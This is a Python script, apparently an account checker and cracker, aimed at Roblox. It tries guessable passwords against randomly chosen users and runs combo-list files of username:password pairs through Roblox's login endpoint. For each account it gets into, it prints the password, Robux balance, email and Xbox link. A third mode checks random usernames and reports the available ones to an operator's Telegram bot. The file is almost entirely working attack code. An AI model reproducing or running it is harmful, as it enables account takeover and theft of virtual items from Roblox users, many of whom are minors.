import requests, random, re, string, json
from bs4 import BeautifulSoup
from datetime import datetime
from rich.console import Console
from rich.table import Table
from fake_useragent import UserAgent
def iFiI():
    import subprocess
    subprocess.check_call(["pip", "install", "requests", "bs4", "rich", "fake_useragent"])
try:
    requests.get('https://www.google.com')
except (ImportError, requests.exceptions.ConnectionError):
    print("Some libraries are missing or network issue detected. Installing required libraries...")
    iFiI()
    print("Libraries installed successfully. Please restart the script.")
    exit()
def login(username, password):
    headers = {
        'authority': 'www.roblox.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': 'https://www.roblox.com/login',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    session = requests.Session()
    ROBLOSECURITY = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_OMEGALUL"
    session.cookies[".ROBLOSECURITY"] = ROBLOSECURITY

    response = session.get('https://www.roblox.com/home', headers=headers).text

    soup = BeautifulSoup(response, "html.parser")
    ok = soup.find_all("meta", {"name": "csrf-token"})
    get = re.findall('n="\S+"', str(ok))
    csrf_token = (get[0]).strip('n=""')

    cookies = {
        '__utma': '210924205.8540409125.1679684617.1697825461.1698477145.92',
        '__utmz': '202924205.1692623377.38.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
        '_ga': 'GA1.1.4188177230.1621889928',
        '_ga_BK4ZY0C59K': 'GS1.1.1193364277.2.1.1693230292.0.0.0',
        '_gcl_au': '1.1.1441391257.2596673046',
        'GuestData': 'UserID=-2329292428',
        'RBXSource': 'rbx_acquisition_time=12/24/2023 3:56:37 AM&rbx_acquisition_referrer=&rbx_medium=Direct&rbx_source=&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1',
        'RBXEventTrackerV2': 'CreateDate=12/24/2023 10:30:12 AM&rbxid=3217369016&browserid=166785499812',
        'rbx-ip2': '',
    }

    headerss = {
        'authority': 'auth.roblox.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://www.roblox.com',
        'pragma': 'no-cache',
        'referer': 'https://www.roblox.com/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        'x-csrf-token': "{}".format(str(csrf_token)),
    }

    json_data = {
        'ctype': 'Username',
        'cvalue': "{}".format(str(username)),
        'password': "{}".format(str(password)),
        "secureAuthenticationIntent": {
            "clientPublicKey": "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEwpuf4Y89wHdDF6+gbbiS+9TizmQdF6VNiU3ftMXHqfHdb2we3O5oW+UEO2pTxkb9ZEgCFrF1hVmbSSR473cCxA==",
            "clientEpochTimestamp": 1720020746,
            "serverNonce": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IlJUV0NGM0hURldIVjlNNksiLCJuYmYiOjE3MjAwMjA3NDYsImV4cCI6MTcyMDAyMTA0NiwiaWF0IjoxNzIwMDIwNzQ2LCJpc3MiOiJoYmEtc2VydmljZSJ9.AQVAgW4z-cYV7EA9g8KE7Qhnfpgh6wp_2V2gwzz8ffE",
            "saiSignature": "hK/1EfD9dLueb51bybPby9UvlumgoVLMKsLfphpQZaJrNU2zE0DnbSOD1T0ZCOzz/PqktZxprNxOpBzpRSUbuQ=="
        }
    }

    response = session.post('https://auth.roblox.com/v2/login', cookies=cookies, headers=headerss, json=json_data)
    
    if "'Incorrect username or password. Please try again." in response.text:
        print("Bad : {}:{}".format(username, password))
    elif "Challenge" in response.text or "'code': 0" in response.text:
        print("Bad : {}:{}".format(username, password))
    else:
        try:
            user_data = response.json()['user']
            user_id = user_data['id']
            username = user_data['name']
            display_name = user_data['displayName']
            is_banned = response.json().get('isBanned', False)
            user_info_url = get_user_info_url(user_id)
            user_currency = sFiS(user_id)
            user_subscription = UFiU(user_id)
            user_email_info = kFiK()
            connected_to_xbox = is_connected_to_xbox()
            
            print("""
            User ID: {}
            Username: {}
            Password : {}
            Display Name: {}
            Is Banned: {}
            Robux : {}
            Plan(sub) : {}
            Email info : {}
            Is Connected To Xbox : {}
            User info Url : {}
            """.format(user_id, username, password, display_name, is_banned, user_currency, user_subscription, user_email_info, connected_to_xbox, user_info_url))
        except:
            print("Username : {}\nPassword : {}".format(username, password))

def get_user_info_url(user_id):
    return f"https://www.roblox.com/users/{user_id}/profile"

def sFiS(user_id):
    url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
    Fix = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    response = requests.get(url, headers=Fix)
    if response.status_code == 200:
        data = response.json()
        robux = data.get("robux", "—ROBUX")
        return f"{robux}—ROBUX"
    return "—ROBUX"

def UFiU(user_id):
    url = f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership"
    Fix = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    response = requests.get(url, headers=Fix)
    if response.status_code == 200:
        data = response.json()
        sab = data.get("subscriptionProductModel", "")
        erm = data.get("errorMessage", "")
        if not sab:
            if erm == "Subscription Not found for user":
                return "NO SUB"
            return "NO SUB"
        return sab
    return "NO SUB"

def kFiK():
    url = "https://accountsettings.roblox.com/v1/email"
    Fix = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    response = requests.get(url, headers=Fix)
    if response.status_code == 200:
        data = response.json()
        verified = data.get("verified", "False")
        email_address = data.get("emailAddress", "NO")
        verified_status = "IS VERIFIED" if verified == "True" else "NOT VERIFIED"
        return f"HAS EMAIL—⟪ {email_address} ⟫ → VERIFIED—{verified_status}"
    return "NO"

def is_connected_to_xbox():
    url = "https://auth.roblox.com/v1/xbox/connection"
    Fix = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    response = requests.get(url, headers=Fix)
    if response.status_code == 200:
        data = response.json()
        has_connected_xbox_account = data.get("hasConnectedXboxAccount", "False")
        return "YES" if has_connected_xbox_account == "True" else "NO"
    return "NO"

def gen_users():
    while True:
        try:
            user_id = random.randint(106, 100010)
            response = requests.get(f'https://friends.roblox.com/v1/metadata?targetUserId={user_id}').json()
            username = response.get('userName')
            if username:
                passwords = oFiO(username)
                for password in passwords:
                    login(username, password)
        except Exception as e:
            print(f"Error: {e}")
            gen_users()

def oFiO(username):
    passwords = [username]
    sFiS = username[:3]
    if (len(sFiS) >= 3):
        passwords.extend([username, sFiS + sFiS, sFiS + "123", '@@@@####', '20182019', '١٢٣'])
    else:
        passwords.extend([username, '19901990', '1122334455@@', 'zzxxccvvbbnnmm', 'mmnnbbvvccxxzz', 'xnxx1234', '1234512345'])

    if len(sFiS) >= 3:
        passwords.extend([username, '20202020', '00998877', 'qqwweerrtt', '30303030', '12345@@@@@', 'aassddffgghhjjkkll', '0099887766', '1@2@3@4@5@'])
    return passwords

def check_from_file(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
        for line in lines:
            username, password = line.strip().split(':')
            login(username, password)

class Roblox_levi:
    def __init__(self):
        self.total_accounts_checked = 0
        self.valid = 0
        self.already = 0
        self.appropriate = 0
        self.only = 0
        self.console = Console()

    def random_date(self):
        year = random.randint(1884, 2024)
        month = random.randint(1, 12)
        day = random.randint(1, 28) if month == 2 else random.randint(1, 30)
        return datetime(year, month, day).isoformat() + 'Z'

    def get_token(self):
        response = requests.get('https://www.roblox.com/login')
        token = re.search(r'<meta name="csrf-token" data-token="(.+?)" />', response.text).group(1) if response.status_code == 200 else None
        return token
    
    def send_telegram_message(self, username, iD, token):
        message = f"Username Valid : {username}"
        url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={iD}&text={message}'
        requests.get(url)

    def display_table(self, username, response_code):
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Checker User Roblox")
        table.add_column("Count")

        table.add_row("Total Accounts Checked", str(self.total_accounts_checked))
        table.add_row("Already Username", str(self.already))
        table.add_row("Valid Username", str(self.valid))
        table.add_row("Appropriate Username", str(self.appropriate))
        table.add_row("Only A-z", str(self.only))
        table.add_row("Response Code", str(response_code))

        self.console.clear()
        self.console.print(table)
        print(f"Username to check : {username}")

    def eFiE(self, username, iD, token):
        token = self.get_token()
        formatted = self.random_date()
        
        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "User-Agent": UserAgent().random,
            "X-Csrf-Token": token,
        }

        data = {
            "birthday": formatted,
            "context": "Signup",
            "username": username
        }

        response = requests.post('https://auth.roblox.com/v1/usernames/validate', headers=headers, data=json.dumps(data))
        
        self.total_accounts_checked += 1
        self.display_table(username, response.status_code)

        if response.status_code == 200:
            code = response.json()['code']
            if code == 0:
                self.valid += 1
                self.send_telegram_message(username, iD, token)
            elif code == 1:
                self.already += 1
            elif code == 2:
                self.appropriate += 1
            elif code == 7:
                self.only += 1
if __name__ == "__main__":
    mode = input("اختر الوضع (random/file/check): ").strip()
    if mode == 'file':
        file_path = input("أدخل اسم الملف: ").strip()
        check_from_file(file_path)
    elif mode == 'random':
        gen_users()
    elif mode == 'check':
        FIX = Roblox_levi()
        iD = input("أدخل معرف التليجرام الخاص بك: ")
        token = input("أدخل رمز التوكن الخاص بك: ")
        length = int(input("أدخل طول اسم المستخدم: "))
        while True:
            Ex = string.ascii_lowercase + string.digits + '_'
            username = ''.join(random.choices(Ex, k=length))
            FIX.eFiE(username, iD, token)
    else:
        print("الرجاء اختيار وضع صحيح: 'random' أو 'file' أو 'check'")
#Q_B_H